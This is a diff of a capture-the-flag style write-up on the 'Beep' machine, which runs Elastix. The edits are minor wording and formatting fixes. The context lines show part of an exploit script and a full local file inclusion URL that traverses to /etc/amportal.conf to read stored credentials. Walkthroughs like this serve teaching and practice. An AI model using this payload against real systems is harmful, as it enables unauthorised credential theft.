@@ -71,7 +71,7 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
 The results are quite abundant here. But what immediately stands out, is Apache running on port 80. Additionally, what could be another way in, is the ssh service on port 22. 
 
 We can check out the https website in our browser. 
-It looks like a redirect of port 443. And shows up a login page provided by Elastix. 
+It looks like a redirect of port 443. And shows us a login page provided by Elastix. 
 
 ''*Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialing.*''
 
@@ -93,7 +93,7 @@ PBX stands for 'Private Branch Exchange' and is an internal telephone network fo
 /mail	        200	336
 /config.php	    200	2151
 /pipermail	    200	882
-/lang	        200	4996
+/lang	        200 4996
 /recordings	    ???	???
 ```  
 
@@ -173,8 +173,10 @@ else {
 print "\n[-] not successful\n";
 	}
 ``` 
-Essentially, the exploit works on the fact that there is an LFI in a certain directory. And this directory is accessible because of its incapability to filter its user input.
-So visiting https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action, should allow us to read credentials. AMPortal credentials according to the exploit. 
+Essentially, the exploit works on the fact that there is an LFI in the *vtigercrm/graph.php* directory. And this directory is accessible because of its incapability to filter its user input.
+So visiting 
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+should allow us to read credentials. AMPortal credentials according to the exploit. 
 
 The output is very messy and hard to read so we can open the page source in another tab instead. 
 Here is the result: 
